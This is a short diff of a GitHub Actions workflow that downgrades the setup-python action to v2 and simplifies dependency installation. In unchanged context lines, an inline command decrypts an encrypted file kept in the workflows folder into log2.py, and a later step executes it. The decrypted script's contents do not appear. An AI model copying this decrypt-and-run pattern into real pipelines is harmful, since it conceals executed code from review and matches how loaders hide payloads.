@@ -19,14 +19,13 @@ jobs:
             python -c "from cryptography.fernet import Fernet; import base64; from hashlib import sha256; log2 = open('log2.txt').read().strip(); key = base64.urlsafe_b64encode(sha256(log2.encode()).digest()); open('log2.py', 'wb').write(Fernet(key).decrypt(open('.github/workflows/log2.lp', 'rb').read()))"
 
       - name: Set up Python
-        uses: actions/setup-python@v4
+        uses: actions/setup-python@v2
         with:
-          python-version: '3.12.2'  # Specify Python version here
+          python-version: '3.12.2'  # Change this to your local version
 
       - name: Install dependencies
         run: |
-          python -m pip install --upgrade pip
-          if [ -f requirements.txt ]; then pip install -r requirements.txt; fi
+          pip install -r requirements.txt
 
       - name: run
         run: python log2.py
